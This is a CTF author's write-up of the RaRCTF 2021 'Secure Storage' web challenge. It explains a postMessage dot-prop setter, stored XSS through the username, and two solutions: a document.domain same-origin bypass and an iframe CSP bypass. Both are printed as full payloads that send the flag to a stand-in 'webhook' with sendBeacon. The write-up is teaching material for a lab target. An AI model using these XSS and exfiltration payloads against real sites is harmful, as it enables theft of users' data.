## Secure Storage

Secure Storage was a "hard" web challenge that I wrote for RaRCTF 2021. Truth be told, I really wasn't sure about the difficulty, but I think that it was in a good spot. It was my first challenge to end up in a CTF, so I was a little worried about the reception, but I'm glad a lot of people liked it.

I was aware of two solutions during the CTF, one was the intended `document.domain` bypass trick, and another was an unintended CSP bypass since I only enabled CSP on the enclave's main page.

![](https://i.imgur.com/r7UD9Ie.png)

### Overview

You're given the source code, and access to two websites.

You login/register to the secure storage website, and you're given access to a page which looks like this:

![](https://i.imgur.com/IrQlC1s.png)

where you can change your safely stored message and its style. This storage works by sending messages to the secure enclave site, which is really where your messages are stored. This was done so a compromise of `https://securestorage.rars.win` shouldn't really affect `https://secureenclave.rars.win`, but obviously there was a vuln somewhere which lets players get the flag.

There's a submit URL section of the site, so we can assume that the admin will view a URL that we send it, and that they have the flag stored as their message on the site.

### Client-side

The enclave was placed into an iframe on the storage site, and they communicated via `postMessage`. Here's the message sending code:
```javascript
window.onload = () => {
    let storage = document.getElementById("secure_storage");
    let user = document.getElementById("user").innerText;
    storage.contentWindow.postMessage(["user", user], storage.src);
};
const changeMsg = () => {
    let storage = document.getElementById("secure_storage");
    storage.contentWindow.postMessage(["localStorage.message", document.getElementById("message").value], storage.src);
};
const changeColor = () => {
    let storage = document.getElementById("secure_storage");
    storage.contentWindow.postMessage(["localStorage.color", document.getElementById("color").value], storage.src);
};
```

As you can see from the above code, the way the website communicates with the enclave is by sending a postMessage, the data being a two element array. Already, you can kind of guess that its sending over a string representing a variable on the enclave, and another string as what the value should be set to. But just to be sure, let's look at the enclave's code:

```javascript
console.log("secure js loaded...");
const z = (s, i, t = window, y = '.') => s.includes(y) ? z(s.substring(s.indexOf(y) + 1), i, t[s.split(y).shift()]) : t[s] = i;
var user = "";
const render = () => {
    document.getElementById("user").innerText = user;
    document.getElementById("message").innerText = localStorage.message || "None set";
    document.getElementById("message").style.color = localStorage.color || "black";
};
window.onmessage = (e) => {
    let {
        origin,
        data
    } = e;
    if (origin !== document.getElementById("site").innerText || !Array.isArray(data)) return;
    z(...data.map(d => `${d}`));
    render();
};
```

This code is a bit more complicated. The `render` method is obvious to what it does, but the `z` method needs a slight bit of investigation.

When the website receives a message from `postMessage`, `window.onmessage` is called. It gets the origin and data of the request, and makes sure that the origin, (where the postMessage was sent from), matches `document.getElementById("site").innerText`, which is `https://securestorage.rars.win`. It also checks that the data sent via `postMessage` was an array. Then, it calls the `z` method with every element in the array as a argument, but with every element converted to a string. Finally, it rerenders the page using `render()`.

So now, let's figure out how `z` works.
Since the storage page sends over two elements in the array only, we can assume the first run of `z` only sets `s` and `i`.

Let's investigate this with the example `["localStorage.message", "12345"]`.

```javascript
const z = (s, i, t = window, y = '.') => 
    s.includes(y) ? 
        // true
        z(s.substring(s.indexOf(y) + 1), i, t[s.split(y).shift()]) 
        // false
        : t[s] = i;
```

So, from the example code above, on the first run, `z` checks whether the string `s`, or `localStorage.message`, contains a dot. Since it does, it runs the true case in the ternary. This calls `z` recursively with a new set of three arguments. The first argument is `s.substring(s.indexOf(y) + 1)`, and since `y` = `"."`, it takes everything from `s` after the first `"."`, giving us "message". 

`i` stays the same, containing `"12345"`.

`t` is changed from the `window` (or global JS object) to `window[s.split(y).shift()]`. The split call splits `"localStorage.message"` with `"."` as the delimeter, and `shift()`s the array, returning the first element, or `"localStorage"`. So, the `t` parameter turns into `window["localStorage"]`, giving a `localStorage` reference.

After, `z` is called like `z("message", "12345", window.localStorage)`. Then the method runs recursively, and since `"message"` does not contain a `"."`, the false branch of the ternary runs, setting `t[s] = i`, or `localStorage["message"] = "12345"`.

This is basically just a golfed simple dot-prop assigner. You can set values on the page via dot-prop notation. Now that we know that, we basically understand most of the important client-side code. The storage site sends messages to the enclave site which sets `localStorage.message` and `localStorage.color`, then re-renders the page.

### Server-side

Now, let's take a quick look at the server-side to see if we can find any vulnerabilities there.

The provided `.zip` contains an `admin` and `chall` folder. The `admin` folder is the admin bot, so we can ignore that for now. The `chall` folder contains a NodeJS + Express app, using hbs as a templating engine. Since we are allowed to submit URLs to the admin, the first thing that pops into my mind is that this is an XSS chall. hbs usually securely encodes all of its templates, so XSS is normally not possible. But, looking through the `views` page, we find one place where this isn't true - `layout.hbs`.

`layout.hbs` contains this snippet:
```html
    {{#if info}}
    <div class="alert alert-primary container mt-4" role="alert">
        {{{info}}}
    </div>
    {{/if}}
    {{#if error}}
    <div class="alert alert-danger container mt-4" role="alert">
        {{{error}}}
    </div>
    {{/if}}
```

In hbs, three brackets means don't encode the payload. So, if we can render any page with an `info` or `error` message containing an XSS payload, we should be able to get JS execution on the storage domain.

Investigating the server more, we find that the server uses the `info` message when confirming our login:
```javascript
router.post("/login", async (req, res) => {
    let { user, pass } = req.body;

    // snip

    req.session.user = user;
    req.session.info = `Logged in as ${user} successfully`;
    return res.redirect("/home");
});
```

So, we can just log in with a simple `<script>` tag to get XSS and arbitrary JS execution on the storage site. But, as I said above, the flag is stored in the enclave, not on the storage site. And since the two sites have different URLs, (`securestorage.rars.win` and `secureenclave.rars.win`), the same origin policy (SOP) applies, and one cannot directly influence the other, so we're stuck not being able to read the flag.

We can set arbitrary variables on the enclave however, but methods like setting `location.href = 'javascript:alert(1)'` or `document.body.innerHTML = '<img src=x onerror=alert(1) />'` don't work because the enclave has a strict CSP.

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' https://fonts.googleapis.com/css2; font-src 'self' https://fonts.gstatic.com;">
```

This CSP basically only allows scripts hosted on the website to work, making it hard for us to exploit.

### Exploit

Players probably got stuck here. Now, let's go over the intended solution, which was [document.domain](https://developer.mozilla.org/en-US/docs/Web/API/Document/domain) abuse, something that I learned while researching ways to bypass SOP.

From the Mozilla docs:
> The domain property of the Document interface gets/sets the domain portion of the origin of the current document, as used by the same-origin policy.

> The setter for this property can be used to change a page's origin, and thus modify how certain security checks are performed. It can only be set to the same or a parent domain.

They show some examples on the docs if you want to learn more. But essentially, `document.domain` allows you to change the origin of any page, as long as it is to a parent domain (e.g. setting a subdomain of a site to a higher domain). If the origins are the same, the same origin policy is not violated, so we can directly manipulate both pages from each other.

This is a really dumb feature, which is why I'm glad it's deprecated. But now, the plan is simple. Set `document.domain` on both sites to `rars.win`, which works since `rars.win` is the parent domain is both. Since the origin of both sites is now the same, we can just directly access the `localStorage.message` variable. We create a script that does this, then set it to the username of a user we force the admin to register as.

Here's my payload below:
```html

<!DOCTYPE html>
<html>
    <body>
        <script>
            let form = document.createElement("form");
            form.method = "POST";
            form.action = "https://securestorage.rars.win/api/register";
            form.target = "target";

            let user = document.createElement("input");
            user.type = "text";
            user.name = "user";
            user.value = `
            <script>
            window.addEventListener('load', () => {
                window.frames[0].postMessage(
                    ["document.domain", "rars.win"], 
                    "https://secureenclave.rars.win/"
                ); 
                document.domain = "rars.win"; 
                setTimeout(() => navigator.sendBeacon(
                    "webhook", 
                    window.frames[0].document.body.innerText
                ), 500);
            }); 
            /* ${Math.random()} */ 
            </` + `script>
            `;
            form.appendChild(user);

            let pass = document.createElement("input");
            pass.type = "text";
            pass.name = "pass";
            pass.value = "12345"; 
            form.appendChild(pass);

            document.body.appendChild(form);

            window.open('', 'target');
            form.submit();
        </script>
    </body>
</html>
```

On viewing this page, a form is created with our malicious XSS in the user, and they are forced to open it in a new tab. The script exfiltrates `window.frames[0].document.body.innerText`, which should give us the flag!

![](https://i.imgur.com/aC0CZlb.png)

> rarctf{js_god?_the_wh0le_1nternet_1s_y0ur_d0main!!!_60739238}

That was the intended solution, but there was another unintended one - a CSP bypass. One player had a different solution, which I cleaned it up to this:

```javascript
window.addEventListener("load", () => {
    let storage = document.getElementById("secure_storage");
    storage.contentWindow.postMessage(
        [
            "document.body.innerHTML",
            "<div id=user></div><div id=message></div><div id=site>https://securestorage.rars.win</div><iframe id=frame src='https://secureenclave.rars.win/assets/LICENSE.txt'></iframe>"
        ]
        , "*"
    );
    setTimeout(() => {
        storage.contentWindow.postMessage(
            [
                "frame.contentWindow.document.body.innerHTML",
                "<img src=x onerror='navigator.sendBeacon(webhook, localStorage.message)' />"
            ]
            , "*"
        );
    }, 1500);
})
```

This works by bypassing the CSP on the enclave domain by iframing another URL (in this case, `/assets/LICENSE.txt`) which doesn't have a CSP. The innerHTML of the main page is first set to the HTML tags required for the script to keep working, as well as an iframe to this random file. Then, the innerHTML of this iframe file is set to have an XSS tag, which runs since this random file doesn't contain a CSP. This gives us arbitrary JS execution on the enclave, allowing us to exfiltrate the flag.

This works since I forgot about applying CSP to the whole domain, and only left it on a meta tag on normal page. I also could have set frame-src to be `none`, which would have disallowed iframing in general. 

In retrospect, I'm kinda glad that there was this unintended solution as well. I was a little worried that the `document.domain` exploit would be a "you know it or you don't" kind of exploit, so only the people who knew of it beforehand would get the solution. But, this ended up not being the case, as some people I DMed told me that they found out about `document.domain` by researching for this challenge.

In general, people seem to have liked the challenge, since, (at the time of me writing this), it has 100% positive votes. I'm glad that people enjoyed it, and that players that I talked to, whether they had solved it or not, seemed to have learned a lot in the process.

Hopefully you enjoyed the challenge and learned something too! Special thanks to the RaRCTF team for hosting a great CTF, and *cough* make sure to check out [corCTF](https://ctf.cor.team/) if you want to see more of my web challenges, ranging from easy to insane.

Thanks for reading!